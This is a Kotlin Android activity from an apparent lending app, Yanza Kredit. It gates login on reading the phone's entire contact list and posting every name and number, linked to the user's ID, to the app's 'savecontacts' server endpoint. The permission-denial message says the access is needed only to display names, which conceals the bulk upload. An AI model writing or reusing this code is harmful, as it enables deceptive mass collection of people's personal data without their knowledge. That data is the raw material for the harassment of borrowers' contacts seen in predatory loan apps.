package com.yanza.kredit.activity

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.os.AsyncTask
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.yanza.kredit.helper.*
import com.yanza.kredit.model.LogsModel
import com.yanza.kredit.model.PhoneModel
import com.yanzu.kredit.R
import kotlinx.android.synthetic.main.activity_logs.*
import org.json.JSONArray
import org.json.JSONObject


class LogsActivity : AppCompatActivity() {
    private val PERMISSIONS_REQUEST_READ_CONTACTS = 100
    private var aa = ArrayList<String>()


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_logs)
        if (getStringPreference(R.string.pref_contact) =="1"){
            loginCondition()
            Log.i("LOGS", "Already saved")
        }else{
            try {

                showContacts()
            }catch (e: Exception){
                Log.i("TAG LOGGS", e.message.toString())
            }
        }

    }
    private fun loginCondition() {
            if (getStringPreference(R.string.login) =="1"){
                val intent = Intent(this, DashboardActivity::class.java)
                startActivity(intent)
                this.finish()
            }
            else{
                val intent = Intent(this, LoginActivity::class.java)
                startActivity(intent)
                this.finish()
            }


    }
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>,
                                            grantResults: IntArray) {
        if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission is granted
                //showContacts()
                getNumber(this.contentResolver)
            } else {
                Toast.makeText(this, "Until you grant the permission, we cannot display the names", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun showContacts() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(Manifest.permission.READ_CONTACTS), PERMISSIONS_REQUEST_READ_CONTACTS)
        } else {
            getNumber(this.contentResolver)
        }
    }

    private fun getNumber(cr: ContentResolver)
    {
        val contactList = ArrayList<PhoneModel>()
        val phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null)
        if (phones != null) {
            while (phones.moveToNext())
            {
                val name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                println("..................$phoneNumber")
                aa.add("Number: $phoneNumber .Name; $name")
            }
        }
        phones?.close()// close cursor
        for (value in aa ){
            val first= PhoneModel()

            val phone1 = value.split(":",".")
            first.phone = phone1[1]
            val name = value.split(";")
            first.name = name[1]
            if (!contactList.contains(first))
                contactList.add(first)
        }
        DumbAsync(contactList).execute()
    }
    @SuppressLint("StaticFieldLeak")
    inner class DumbAsync(private var contactList: ArrayList<PhoneModel>) :AsyncTask<Void, Int,String>() {

        var e: java.lang.Exception? = null
        override fun doInBackground(vararg p0: Void?): String? {

            try {  val jsonArray = JSONArray()//Gson().toJson(contactList)
                val map = JSONObject()

                for (i in contactList) {
                    val contactObject = JSONObject()
                    contactObject.put("name", i.name)
                    contactObject.put("number", i.phone)
                    jsonArray.put(contactObject)
                }
                map.put("user_id", getIntPreference(R.string.user_id) )
                map.put("data", jsonArray)

                println("contactList, $map")
                val url = Const.YANZA_KREDIT + "savecontacts"

                return HttpUtility.postJson(url, map)
            }catch (e:Exception){
                Log.i("TAG_LOGIN", e.message.toString())
            }
            return null
        }

        override fun onPostExecute(result: String?) {
            super.onPostExecute(result)
            if (!result.isNullOrEmpty()) {
                val gson = Gson()
                try {
                    val type = object : TypeToken<LogsModel>() {}.type
                    val userModel = gson.fromJson<LogsModel>(result, type)
                    if (userModel.status!!) {
                        saveToSharedPreference( R.string.pref_contact,"1")
                        Toast.makeText(this@LogsActivity, result, Toast.LENGTH_LONG).show()
                        loginCondition()
                    } else
                        Toast.makeText(this@LogsActivity, "Please close the app and open it again", Toast.LENGTH_LONG).show()
                } catch (e: Exception) {
                    this.e = e

                    Log.e("LOGS", e.message.toString())
                }

            }
            else {
                val msg = if (e?.message == null)
                    "An error occurred while setting up your account. Try again later"
                else e!!.message
                txtMsg.text = msg
            }
        }
    }
}
